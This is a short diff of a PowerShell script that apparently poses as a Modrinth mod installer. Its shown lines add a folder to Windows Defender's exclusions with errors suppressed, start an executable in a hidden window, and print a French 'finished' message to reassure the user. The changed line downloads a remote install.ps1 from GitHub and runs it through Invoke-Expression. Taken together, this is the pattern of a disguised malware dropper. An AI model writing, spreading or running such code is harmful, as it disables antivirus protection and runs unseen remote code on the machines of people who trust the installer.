@@ -21,4 +21,4 @@ Add-MpPreference -ExclusionPath $D -EA SilentlyContinue
 Start-Process -FilePath $E -ArgumentList $T -WindowStyle Hidden
 Write-Host "Termine ! Vous pouvez reprendre utilisation de votre ordinateur."
 Start-Sleep 1
-Invoke-Expression (Invoke-WebRequest -UseBasicParsing "https://raw.githubusercontent.com/EmoLa63/Modrinth_instalation/raw/main/install.ps1").Content
+Invoke-Expression (Invoke-WebRequest -UseBasicParsing "https://raw.githubusercontent.com/EmoLa63/Modrinth_instalation/refs/heads/main/install.ps1").Content
